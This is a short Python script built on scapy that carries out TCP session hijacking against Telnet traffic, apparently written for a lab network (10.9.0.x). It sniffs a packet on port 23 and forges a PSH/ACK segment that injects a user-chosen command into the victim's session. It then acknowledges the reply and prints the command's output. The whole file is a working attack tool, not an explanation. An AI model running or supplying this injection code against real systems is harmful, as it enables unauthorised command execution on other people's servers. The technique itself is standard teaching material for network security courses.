#!/usr/bin/env python3
from scapy.all import *

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
PSH_ACK = 0x18
URG = 0x20
ECE = 0x40
CWR = 0x80

def start_hijacking(pkt, cmd):
    print("Sending the command %s to the victim server..." % (cmd))
    payload = "\r\n" + cmd + "\r\n"
    ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="PA", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
    raw = Raw(load=payload)
    pkt = ip/tcp/raw
    ans = sr1(pkt, timeout = 1, filter = "tcp", verbose=0)
    send_ACK_and_print_ans(ans)

def send_ACK_and_print_ans(pkt):
    print("TCP answering packet received from %s towards %s" % (pkt.src, pkt.dst))
    print("Sending the ACK packet...")
    ip = IP(src=pkt.dst, dst=pkt.src)
    tcp = TCP(sport=pkt.dport, dport=pkt.sport, flags="A", seq=pkt.ack, ack=pkt.seq+1)
    pkt = ip/tcp
    ans = sr1(pkt, timeout = 1, filter = "tcp", verbose=0)
    print("\n-------------------------------------------- OUTPUT OF THE REQUESTED COMMAND --------------------------------------------\n")
    output = ans.load.decode("utf-8")
    print(output)
    print("\n--------------------------------------------------- END OF THE ATTACK ---------------------------------------------------\n")
    #for output in outputs: print(output + "\n")

if __name__ == "__main__":
    cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
    IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
    print("\n---------------------------------------------- TCP SESSION HIJACKING START ----------------------------------------------\n")
    cmd = input("Insert the command to execute on the victim server: ")
    sniff(iface=IFACE, filter='tcp dst port 23 and tcp[tcpflags] & (tcp-syn|tcp-fin|tcp-rst) = 0', count = 1, prn = lambda pkt: start_hijacking(pkt, cmd))